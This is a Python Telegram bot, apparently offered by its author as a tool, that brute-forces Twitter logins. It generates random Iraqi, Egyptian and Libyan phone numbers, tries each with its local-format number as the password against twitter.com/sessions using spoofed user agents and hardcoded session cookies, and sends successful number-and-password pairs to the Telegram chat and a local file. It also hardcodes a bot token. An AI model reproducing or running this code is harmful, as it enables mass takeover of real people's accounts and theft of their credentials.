import os
try:
	import random
	import telebot
	import requests
	import user_agent
	import mechanize
	import json
except:
	os.system('pip install requests')
	os.system('pip install mechanize')
	os.system('pip install json')
	os.system('pip uninstall telebot')
	os.system('pip uninstall PyTelegramBotAPI')
	os.system('pip install telebot')
	os.system('pip install PyTelegramBotAPI==3.6.7')
	pass	



import random
import telebot
import requests
import user_agent
from user_agent import generate_user_agent
from telebot import types
import mechanize
import json
import time
#################################
#################################

tok =("1361009310:AAG2EwcH4dZ3rYH3943fsJNMRcjMBjFb1Bg")
bot = telebot.TeleBot(tok)
bot.remove_webhook()

#################################
#################################

check = types.InlineKeyboardButton(text ="- STaRT 🎁", callback_data = 'check')
ch = types.InlineKeyboardButton(text = "- BoT BY 📄", url = 't.me/kaero7')
@bot.message_handler(commands=['start'])
def start(message):
    use = message.from_user.username
    fr = message.from_user.first_name
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 1
    maac.add(check,ch)
    bjj = message.chat.id
    bot.send_message(message.chat.id,text=f"""
Welcome 🇮🇶
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
Tool Check Twitter In 3 Countries ❤️


BY : @Kaero7
    """,parse_mode='html',reply_to_message_id=message.message_id, reply_markup=maac)
    
@bot.callback_query_handler(func=lambda call: True)
def qwere(call):
    if call.data == 'check':
    	countres(call.message)
    if call.data == 'iraq':
    	iraq(call.message)
    
    if call.data == 'Egypt':
    	egypt(call.message)
    if call.data == 'Libya':
    	libya(call.message)
 




cb = types.InlineKeyboardButton(text ="- Iraq 🇮🇶", callback_data = 'iraq')
kaero = types.InlineKeyboardButton(text ="- Egypt 🇪🇬", callback_data = 'Egypt')
cb2 = types.InlineKeyboardButton(text ="- Libya 🇱🇾", callback_data = 'Libya')
def countres(message):
    can = types.InlineKeyboardMarkup()
    can.row_width = 1
    can.add(cb,kaero,cb2,ch)	
    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="Choose Country For Check 🚸  ",reply_markup=can)








def iraq(message):
	bad = 0
	available = 0
	a7rf = "0192837465"
	
	nu = ['78','77','75','79']
	r=requests.session()
	while True:
	        num = str("".join(random.choice(nu)for i in range(1)))
	        numbers = str("".join(random.choice(a7rf)for i in range(7)))
	        pn = '964'+num+'1'+numbers
	        pas = '0'+num+'1'+numbers
	        headers={
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
		'Content-Length': '901',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
		'Host': 'twitter.com',
		'Origin': 'https://twitter.com',
		'Referer': 'https://twitter.com/login?lang=ar',
		'TE': 'Trailers',
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': generate_user_agent()
	        }
	        datta={
		'redirect_after_login': '/',
		'remember_me': '1',
		'authenticity_token': '10908ac0975311eb868c135992f7d397',
		'wfa': '1',
		'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		'session[username_or_email]': pn,
		'session[password]': pas
	        }
	        url = 'https://twitter.com/sessions'
	        try:
	        	rq=requests.post(url,headers=headers,data=datta)
	        	if ("ct0") in rq.cookies:
	        		available +=1
	        		bot.send_message(message.chat.id,f"""
Twitter Available 😁🔥
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📧┇Email ~⪼ {pn}
📟┇Pass ~⪼ {pas}
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📄┇@Kaero7
	        	""")
	        		with open('Tw_OK.txt', 'a') as M:
	        			M.write(pn+':'+pas+'\n')
	        		
	        	else:
	        		bad+=1
	        		iraq_ch(message,available,bad,pn)
	        except:
	        	time.sleep(3)
	        




def iraq_ch(message,available,bad,pn):
            aac = types.InlineKeyboardMarkup()
            aac.row_width = 2
            i1 = types.InlineKeyboardButton(text = "Available 🔥", callback_data = 'i1')
            i2 = types.InlineKeyboardButton(text = "Not Available ☄️", callback_data = 'i2')
            i2_2 = types.InlineKeyboardButton(text = f"{bad}", callback_data = 'i22')
            i3 = types.InlineKeyboardButton(text = "Number", callback_data = 'i3')
            i3_2 = types.InlineKeyboardButton(text = f"{pn}", callback_data = 'i32')  
            i1_2 = types.InlineKeyboardButton(text = f"{available}", callback_data = 'i12')
            aac.add(i1,i1_2,i2,i2_2,i3,i3_2)
            m = message.chat.id
            bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=f"""
Whiting Check. In Twitter ✅

@Kaero7 - @eccee8
""", reply_markup=aac)






def libya(message):
	bad = 0
	available = 0
	a7rf = "0192837465"
	
	nu = ["92","94","91"]
	r=requests.session()
	while True:
	        num = str("".join(random.choice(nu)for i in range(1)))
	        numbers = str("".join(random.choice(a7rf)for i in range(7)))
	        pnsn = '218'+num+numbers
	        ps = '0'+num+numbers
	        head={
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
		'Content-Length': '901',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
		'Host': 'twitter.com',
		'Origin': 'https://twitter.com',
		'Referer': 'https://twitter.com/login?lang=ar',
		'TE': 'Trailers',
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': generate_user_agent()
	        }
	        data={
		'redirect_after_login': '/',
		'remember_me': '1',
		'authenticity_token': '10908ac0975311eb868c135992f7d397',
		'wfa': '1',
		'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		'session[username_or_email]': pnsn,
		'session[password]': ps
	        }
	        url = 'https://twitter.com/sessions' 
	        try:
	        	req=requests.post(url,head=headers,data=data)
	        	if ("ct0") in req.cookies:
	        		available +=1
	        		bot.send_message(message.chat.id,f"""
Twitter Available 😁🔥
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📧┇Email ~⪼ {pnsn}
📟┇Pass ~⪼ {ps}
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📄┇@Kaero7
	        	""")
	        		with open('Tw_OK.txt', 'a') as M:
	        			M.write(pnsn+':'+ps+'\n')
	        		
	        	else:
	        		bad+=1
	        		libya_ch(message,available,bad,pnsn)
	        except:
	        	time.sleep(3)




def libya_ch(message,available,bad,pnsn):
            aac = types.InlineKeyboardMarkup()
            aac.row_width = 2
            i1 = types.InlineKeyboardButton(text = "Available 🔥", callback_data = 'i1')
            i2 = types.InlineKeyboardButton(text = "Not Available ☄️", callback_data = 'i2')
            i2_2 = types.InlineKeyboardButton(text = f"{bad}", callback_data = 'i22')
            i3 = types.InlineKeyboardButton(text = "Number", callback_data = 'i3')
            i3_2 = types.InlineKeyboardButton(text = f"{pnsn}", callback_data = 'i32')  
            i1_2 = types.InlineKeyboardButton(text = f"{available}", callback_data = 'i12')
            
            aac.add(i1,i1_2,i2,i2_2,i3,i3_2)
            m = message.chat.id
            bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=f"""
Whiting Check. In Twitter


@Kaero7 - @eccee8
""", reply_markup=aac)



def egypt(message):
	bad = 0
	available = 0
	a7rf = "0192837465"

	nu = ['11','10']
	r=requests.session()
	while True:
	        num = str("".join(random.choice(nu)for i in range(1)))
	        numbers = str("".join(random.choice(a7rf)for i in range(7)))
	        pnn = '20'+num+'1'+numbers
	        pa = '0'+num+'1'+numbers
	        heads={
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
		'Content-Length': '901',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
		'Host': 'twitter.com',
		'Origin': 'https://twitter.com',
		'Referer': 'https://twitter.com/login?lang=ar',
		'TE': 'Trailers',
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': generate_user_agent()
	        }
	        datas={
		'redirect_after_login': '/',
		'remember_me': '1',
		'authenticity_token': '10908ac0975311eb868c135992f7d397',
		'wfa': '1',
		'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		'session[username_or_email]': pnn,
		'session[password]': pa
	        }
	        url = 'https://twitter.com/sessions'
	        try:
	        	eq=requests.post(url,headers=heads,data=datas)
	        	if ("ct0") in eq.cookies:
	        		available +=1
	        		bot.send_message(message.chat.id,f"""
Twitter Available 😁🔥
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📧┇Email ~⪼ {pnn}
📟┇Pass ~⪼ {pa}
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📄┇@Kaero7
	        	""")
	        		with open('Tw_OK.txt', 'a') as M:
	        			M.write(pnn+':'+pa+'\n')
	        	else:
	        		bad+=1
	        		egypt_ch(message,available,bad,pnn)
	        except:
	        	time.sleep(3)




def egypt_ch(message,available,bad,pnn):
            aac = types.InlineKeyboardMarkup()
            aac.row_width = 2
            i1 = types.InlineKeyboardButton(text = "Available 🔥", callback_data = 'i1')
            i2 = types.InlineKeyboardButton(text = "Not Available ☄️", callback_data = 'i2')
            i2_2 = types.InlineKeyboardButton(text = f"{bad}", callback_data = 'i22')
            i3 = types.InlineKeyboardButton(text = "Number", callback_data = 'i3')
            i3_2 = types.InlineKeyboardButton(text = f"{pnn}", callback_data = 'i32')  
            i1_2 = types.InlineKeyboardButton(text = f"{available}", callback_data = 'i12')
            
            aac.add(i1,i1_2,i2,i2_2,i3,i3_2)
            m = message.chat.id
            bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=f"""
Whiting Check. In Twitter


@Kaero7 - @eccee8
""", reply_markup=aac)


def bac(message):
    use = message.from_user.username
    fr = message.from_user.first_name
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 1
    maac.add(check,ch)
    bjj = message.chat.id
    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=f"""
Welcome 🇮🇶
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
Tool Check Twitter In 3 Countries ❤️


BY : @Kaero7
    """,reply_markup=maac)

while True:
	try:
		bot.polling()
	except:
		pass